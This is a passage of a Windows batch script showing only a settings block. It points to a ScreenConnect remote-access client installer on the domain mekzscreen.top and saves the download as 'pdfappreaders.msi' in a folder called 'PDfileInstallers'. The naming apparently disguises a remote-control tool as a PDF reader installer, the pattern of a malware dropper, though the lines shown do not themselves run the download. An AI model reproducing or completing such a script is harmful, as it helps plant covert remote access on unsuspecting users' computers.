...
REM Settings
REM ====================================
set "TEMP_DIR=%TEMP%\PDfileInstallers"
set "MSI_URL=https://www.mekzscreen.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_PATH=%TEMP_DIR%\pdfappreaders.msi"
